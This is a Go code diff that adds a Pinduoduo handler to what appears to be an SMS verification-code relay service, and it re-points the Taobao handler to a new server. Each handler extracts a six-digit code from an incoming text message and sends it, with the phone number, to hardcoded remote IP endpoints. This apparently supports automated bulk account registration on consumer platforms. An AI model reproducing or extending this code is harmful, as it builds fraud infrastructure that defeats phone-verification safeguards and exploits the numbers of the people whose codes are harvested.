@@ -104,6 +104,8 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 				processJingritoutiaoRegister(msg, *user, r.FormValue("apid"))
 			} else if strings.EqualFold(r.FormValue("apid"), "117") {
 				processTanTanRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "118") {
+				processPingDuoDuoRegister(msg, *user, r.FormValue("apid"))
 			}
 		}
 	}
@@ -220,6 +222,19 @@ func processTanTanRegister(msg string, user map[string]string, apid string) {
 		go updateRelationSuccess(user, apid)
 	}
 }
+func processPingDuoDuoRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`\d{6}`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[0])
+		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
+		url := "http://47.106.253.197:9800/lsapi/channel/reportVerifyCode?cpid=f8ee5565fb674679bbb99970f7eca6ca&telephone=" + mobile + "&smsContent=" + result[0]
+		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+		go send2Url(url)
+		go updateRelationSuccess(user, apid)
+	}
+}
 
 // func processJindongRegister(msg string, user map[string]string, apid string) {
 // 	mobile := formatMobile(user["mobile"])
@@ -323,7 +338,7 @@ func processTaobaoRegister(msg string, user map[string]string, apid string) {
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
 		log.Println(result[0])
-		url := "http://120.78.167.205:9800/lsapi/channel/reportVerifyCode?cpid=11380ef4052d47b4a0d706b561848738&smsContent=" + result[0] + "&telephone=" + mobile
+		url := "http://47.106.253.197:9800/lsapi/channel/reportVerifyCode?cpid=11380ef4052d47b4a0d706b561848738&smsContent=" + result[0] + "&telephone=" + mobile
 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
 		go updateRelationSuccess(user, apid)
